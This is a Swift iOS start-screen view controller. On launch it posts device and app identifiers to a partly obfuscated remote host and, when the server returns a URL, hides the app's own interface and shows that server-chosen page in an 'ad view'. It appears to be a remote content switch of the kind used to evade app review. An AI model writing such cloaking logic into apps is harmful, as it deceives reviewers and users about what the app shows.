//
//  FluxStartVC.swift
//  IntelliShiftRepterFluxotron
//
//  Created by SunTory on 2025/3/7.
//

import UIKit

class FluxStartVC: UIViewController {

    @IBOutlet weak var btnbgView: UIView!

    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        fluxNeedsShowAdsLocalData()
    
    }
    
    private func fluxNeedsShowAdsLocalData() {
           guard self.fluxNeedShowAdsView() else {
               return
           }
           self.btnbgView.isHidden = true
           fluxPostForAppAdsData { adsData in
               if let adsData = adsData {
                   if let adsUr = adsData[2] as? String, !adsUr.isEmpty,  let nede = adsData[1] as? Int, let userDefaultKey = adsData[0] as? String{
                       UIViewController.fluxSetUserDefaultKey(userDefaultKey)
                       if  nede == 0, let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any] {
                           self.fluxShowAdView(locDic[2] as! String)
                       } else {
                           UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                           self.fluxShowAdView(adsUr)
                       }
                       return
                   }
               }
               self.btnbgView.isHidden = false
           }
       }
    private func fluxPostForAppAdsData(completion: @escaping ([Any]?) -> Void) {
            
            let url = URL(string: "https://open.qiongji.t\(self.fluxMainHostUrl())/open/fluxPostForAppAdsData")!
            var request = URLRequest(url: url)
            request.httpMethod = "POST"
            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
            let parameters: [String: Any] = [
                "sequenceAppModel": UIDevice.current.model,
                "appKey": "cad52d638ec744728033dc145068a75b",
                "appPackageId": "com.app.IntelliShiftRepterFluxotron", //
                "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
            ]

            do {
                request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
            } catch {
                completion(nil)
                return
            }
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
                    DispatchQueue.main.async {
                        guard let data = data, error == nil else {
                            completion(nil)
                            return
                        }
                        
                        do {
                            let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                            if let resDic = jsonResponse as? [String: Any] {
                                if let dataDic = resDic["data"] as? [String: Any],  let adsData = dataDic["jsonObject"] as? [Any]{
                                    completion(adsData)
                                    return
                                }
                            }
                            print("Response JSON:", jsonResponse)
                            completion(nil)
                        } catch {
                            completion(nil)
                        }
                    }
                }

                task.resume()
           
    }

}



